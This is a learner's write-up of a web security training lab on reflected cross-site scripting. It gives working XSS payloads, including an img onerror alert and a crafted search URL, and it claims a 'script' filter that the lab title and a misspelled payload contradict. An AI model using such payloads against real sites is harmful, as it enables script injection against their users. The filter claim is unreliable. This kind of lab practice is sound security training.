# Lab: Reflected XSS into HTML context with nothing encoded  
**Level:** APPRENTICE  

---

## 🔗 Lab URL  
[https://0a130085045e67ba8032039b00c5004a.web-security-academy.net/](https://0a130085045e67ba8032039b00c5004a.web-security-academy.net/)

---

## 🧪 Steps (My Approach)

1. ✅ **Typed `coffee`** in search → reflected in:
   - URL parameter  
   - Page body:  
     ```html
     <h1>0 search results for 'coffee'</h1>
     ```

2. ✅ **Tested `coffee">`**  
   → Output:  
   ```html
   <h1>0 search results for 'coffee">'</h1>
   ```

3. 🔄 **Tried basic XSS payload**:  
   ```html
   coffee<scripr>alert(1)</script></h1><!--
   ```
   ❌ Blocked: word `script` is filtered.

4. ✅ **Bypassed using `img` tag**:  
   ```html
   coffee<img src=x onerror="alert(1)"></h1><!--
   ```
   🎉 Success! Alert triggered → lab solved.

---

## ✅ Final Payload  
```html
<img src=x onerror="alert(1)">
```

Encoded in URL:  
```
?search=coffee<img src=x onerror="alert(1)"></h1><!--
```

---

## 🛠 Tools  
- Manual testing in browser  
- View Page Source  
- Tried different payloads (script bypass)

---

## 🎯 Goal  
Trigger a JavaScript alert using reflected XSS.

---

## 🧠 Notes  
- No filtering on special characters like `>`  
- Only `<script>` is blocked  
- Closing tags + `<!--` useful to preserve page layout

---

## ✅ Status: Solved
